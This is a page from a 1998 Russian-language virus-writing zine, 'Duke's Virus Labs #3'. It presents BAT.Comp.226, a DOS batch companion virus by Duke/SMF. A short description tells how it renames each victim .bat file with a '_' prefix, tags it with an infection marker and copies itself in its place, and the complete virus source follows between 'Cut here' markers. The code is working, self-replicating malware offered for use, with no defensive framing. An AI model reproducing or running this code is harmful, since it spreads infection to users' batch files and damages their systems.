- [Duke's Virus Labs #3] - [Page 09] -

BAT.Comp.226
(c) by Duke/SMF

Имя вируса    : BAT.Comp.226
Автор         : Duke/SMF
Дата создания : 19.11.98

Характерный пример компаньон вируса, написанного на BAT-языке.
Файл-жертва переименовывается, петем добавления символа "_" к началу имени,
а вирус записывается вместо файла-жертвы. Чтобы избежать повторного заражения,
в конец переименованной жертвы дописывается в качестве идентификатора
строка "@rem _Duke/SMF_". Для проверки на зараженность вирус использует
утилиту FIND, поэтому он будет неработоспособен без наличия утилиты в PATH.
Вирус перестает корректно работать при некоторых условиях - при желании
вы определите их сами :)

===== Cut here =====
@ctty nul
if "%1=="$ goto $z
set p=_
for %%b in (*.bat) do call %0 $ %%b
ctty con
@call %p%%0
@exit
:$z
find "_"<%2>nul
if not errorlevel 1 goto end
echo.>>%2
echo>>%2 @rem _Duke/SMF_
ren %2 %p%%2
copy %0 %2
:end
===== Cut here =====
